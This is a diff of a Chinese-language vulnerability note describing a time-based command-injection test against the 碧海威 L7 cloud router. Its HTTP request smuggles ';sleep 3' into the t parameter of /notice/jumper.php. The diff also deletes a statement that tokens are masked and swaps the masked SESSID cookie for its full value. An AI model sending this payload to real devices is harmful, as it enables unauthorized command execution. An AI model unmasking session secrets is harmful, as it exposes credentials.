@@ -36,7 +36,6 @@ source_status: "recorded"
 - 仅sleep3请求无基线/响应；与361/362同入口简稿
 - WIFISKY263请求含相同cookie，来源独立性需核验
 - 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -66,7 +65,7 @@ product="碧海威科技-L7云路由"
 ```http
 GET /notice/jumper.php?t=;sleep%203 HTTP/1.1
 Host: 
-Cookie: SESSID=e2c**************************57b
+Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
